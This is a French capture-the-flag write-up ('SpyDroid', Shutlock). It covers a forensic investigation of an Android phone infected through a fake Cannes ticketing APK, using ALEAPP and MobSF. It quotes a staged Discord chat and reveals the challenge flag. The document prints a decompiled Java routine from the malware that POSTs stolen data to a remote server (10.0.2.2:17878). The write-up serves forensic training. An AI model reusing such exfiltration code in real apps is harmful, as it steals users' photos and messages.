SpyDroid
=============

On va utiliser ALEAPP (https://github.com/abrignoni/ALEAPP) et regarder les informations a notre disposition : 

On trouve d'abord l'email de la victime : lauracinema958@gmail.com,

Historique de conversation Discord : 

pierrebzh_92574 : 
Bonâ€¦ je commence Ã  perdre patience. Trois jours que jâ€™essaie de rÃ©server des billets Ã  lâ€™ouverture, et trois jours que le site plante. Ce matin jâ€™ai mÃªme pas vu la file dâ€™attente, juste un "erreur 503".

laura_cinema : 
MÃªme chose. Jâ€™Ã©tais prÃªte Ã  8h55 avec mon cafÃ©, tout bien calÃ©â€¦ RÃ©sultat : chargement infini, puis plus rien. Jâ€™ai actualisÃ© 15 fois, et puis jâ€™ai abandonnÃ©.

ludotech_ : 
On dirait que rien nâ€™a changÃ© depuis lâ€™annÃ©e derniÃ¨re. Leur plateforme est toujours aussi fragile. Câ€™est incomprÃ©hensible quâ€™un Ã©vÃ¨nement comme Cannes ait un systÃ¨me aussi peu fiable

pierrebzh_92574 : 
Et le pire, câ€™est quâ€™on sait dâ€™avance que ce sera pareil lâ€™an prochain. Ils doivent se dire que les gens viendront quand mÃªme, alors pourquoi se fatiguerâ€¦

laura_cinema : 
En attendant, nous on peut pas rÃ©server un seul film. Câ€™est Ã©puisant. Tu prÃ©pares ton programme pendant des semaines pour rien.

ludotech_ : 
Bon. Jâ€™vous lis galÃ©rer depuis ce matin et jâ€™me dis que câ€™est peut-Ãªtre le moment de partager un truc que jâ€™ai trouvÃ©. Câ€™est pas officiel, donc Ã  prendre avec des pincettes. Mais jâ€™ai testÃ©, et pour moi Ã§a marche.

pierrebzh_92574 : 
h, voilÃ â€¦ le moment oÃ¹ Ludo sort sa botte secrÃ¨te. Jâ€™espÃ¨re que câ€™est pas encore un fichier zip trouvÃ© sur un chan Telegram douteux.

ludotech_ : 
Haha non, rien dâ€™illÃ©gal, tâ€™inquiÃ¨te. Câ€™est une appli Android â€” une APK, donc â€” quâ€™un gars a dÃ©veloppÃ©e et partagÃ©e sur un forum. Le mec est franÃ§ais apparemment. Il a codÃ© un truc pour centraliser les sÃ©ances du Festival. Et il y a mÃªme une option de "rÃ©servation directe" dessus.

laura_cinema : 
Tu veux dire quâ€™on peut rÃ©server via cette appli ? Parce que si câ€™est vrai, je la prends direct. Le site officiel me rend folle.

ludotech_ : 
Câ€™est ce que jâ€™ai compris ouais. Moi je suis pas Ã  Cannes donc jâ€™ai pas pu tester la rÃ©sa, mais tout le reste est fonctionnel. Tu peux filtrer par jour, voir les films, les horaires, les lieux, tout Ã§a. Lâ€™interface est propre, sombre, sans pubs, et Ã§a rame pas.

pierrebzh_92574 : 
Tu lâ€™as trouvÃ©e oÃ¹ exactement ton appli ? Et pourquoi elle est pas sur le Play Store si elle est si bien que Ã§a ?

ludotech_ : 
Lâ€™auteur disait quâ€™il voulait pas la publier publiquement pour Ã©viter que trop de monde sâ€™en serve. Il lâ€™a balancÃ©e sur un forum fermÃ©, et câ€™est un autre membre qui a partagÃ© le lien. Je lâ€™ai tÃ©lÃ©chargÃ©e, installÃ©e, et franchementâ€¦ rien Ã  signaler

laura_cinema : 
lle demande quoi comme autorisations ? Parce que jâ€™ai pas envie de finir avec un spyware.

ludotech_ : 
Juste les photos + SMS. Rien dâ€™extraordinaire pour une appli de ce type. Pas dâ€™inscription, pas de compte Ã  crÃ©er, pas de redirection suspecte.

pierrebzh_92574 : 
Bon moi jâ€™passe. Rien que "APK sur un forum", Ã§a me refroidit. Jâ€™ai pas envie de voir ma galerie de photos sur Twitter.

laura_cinema : 
Bah Ã©couteâ€¦ Franchement je suis Ã  bout. Jâ€™en ai marre de tourner en rond avec le site officiel. Si yâ€™a une chance que je puisse rÃ©server autrement, je tente. Câ€™est pas comme si jâ€™avais mille solutions de toute faÃ§on.

ludotech_ : 
Ok, je tâ€™envoie l'appli : Nom du fichier : **CannesBilletterie.apk** Tu me diras ce que tâ€™en penses.

laura_cinema : 
Je tÃ©lÃ©chargeâ€¦
TÃ©lÃ©chargement terminÃ©. Je lance lâ€™installation. Bonâ€¦ faut activer "sources inconnues", je sais, câ€™est pas lâ€™idÃ©al, mais tant pis.

pierrebzh_92574 : 
Tu fais comme tu veux heinâ€¦ mais garde-nous au courant si lâ€™appli te demande soudain ton code bancaire ğŸ˜…

laura_cinema : 
Câ€™est bon, installÃ©e. Jâ€™ouvre lâ€™appli.

Bon on a dÃ©ja pas mal d'info sur ce qu'il s'est passÃ©.


On trouve aussi cet email : 
Bonjour Laura,

Nous avons le plaisir de vous annoncer le lancement dâ€™un nouveau concours qui mettra vos talents dâ€™analyse et vos compÃ©tences techniques Ã  lâ€™Ã©preuve !

ğŸ¯ Objectif :
Identifier et reconstruire un code cadeau cachÃ© Ã  partir d'une situation simulÃ©e de compromission. Le premier Ã  soumettre le bon format remportera une rÃ©compense exclusive !

ğŸ§© Format du code :
Le code cadeau est Ã  reconstituer sous le format suivant :

SHUTLOCK{nom_appli/pseudo_de_l'attaquant/jour_infection/IP_Destination}

Exemple :
SHUTLOCK{com.example.webmail/rootkit42/12-04-2025/192.168.1.15}

EnvoyÃ© avec la messagerie sÃ©curisÃ©e Proton Mail.

On a priori un format flag ? SHUTLOCK{nom_appli/pseudo_de_l'attaquant/jour_infection/IP_Destination}

On a dÃ©jÃ  le nom de l'application, que l'on retrouve dans data/data/fr.shutlock.billetterievipcannes 

Le pseudo de l'attaquant **ludotech_**

La date avec le jour des messages : **15-04-2025**

Il ne manque que l'IP.

On envoie l'apk sur mobsf.live, on attend l'analyse

Et on regarde la liste de connexions, ou bien directement dans le code de l'app : 

.. code-block:: console

            public Void doInBackground(String... params) {
            String imagePath = params[0];
            try {
                URL url = new URL("http://10.0.2.2:17878/");
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setDoOutput(true);
                connection.setRequestMethod("POST");
                connection.setRequestProperty("Content-Type", "application/octet-stream");
                OutputStream os = connection.getOutputStream();
                byte[] buffer = imagePath.getBytes();
                os.write(buffer);
                os.flush();
                os.close();
                Log.w("TAG", "SMS sent to server: " + imagePath);
                return null;
            } catch (IOException e) {
                e.printStackTrace();
                return null;
            }
        }
    }

On retrouve alors notre IP : **10.0.2.2** 

On a donc notre flag : **SHLK{fr.shutlock.billetterievipcannes/ludotech_/15-04-2025/10.0.2.2}**